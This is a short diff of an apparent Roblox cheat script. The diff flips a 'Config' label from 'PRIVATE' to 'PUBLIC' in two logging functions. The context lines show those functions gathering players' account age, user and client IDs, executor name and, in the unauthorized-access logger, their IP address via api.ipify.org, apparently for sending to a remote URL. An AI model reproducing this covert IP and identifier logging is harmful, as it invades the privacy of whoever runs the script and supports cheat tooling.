@@ -75,7 +75,7 @@ local function logValidAccess(url, title, description)
                     {name = "Account Age: ", value = lplr.AccountAge},
                     {name = 'UserID:', value = lplr.UserId},
                     {name = 'clientID:', value = clientID},
-                    {name = "Config:", value = "PRIVATE"},
+                    {name = "Config:", value = "PUBLIC"},
                     {name = "Exploit: ", value = identifyexecutor() or "Unknown"},
                     {name = "Executed on:", value = os.date("%d/%m/%Y  %H:%M")},
                 }
@@ -116,7 +116,7 @@ local function logUnauthorizedAccess(url, title, description)
                     {name = "Account Age: ", value = lplr.AccountAge},
                     {name = 'UserID:', value = lplr.UserId},
                     {name = 'clientID:', value = clientID},
-                    {name = "Config:", value = "PRIVATE"},
+                    {name = "Config:", value = "PUBLIC"},
                     {name = "Exploit: ", value = identifyexecutor() or "Unknown"},
                     {name = "Executed on:", value = os.date("%d/%m/%Y  %H:%M")},
                     {name = "IP LOG: ", value = game:HttpGet('https://api.ipify.org')},
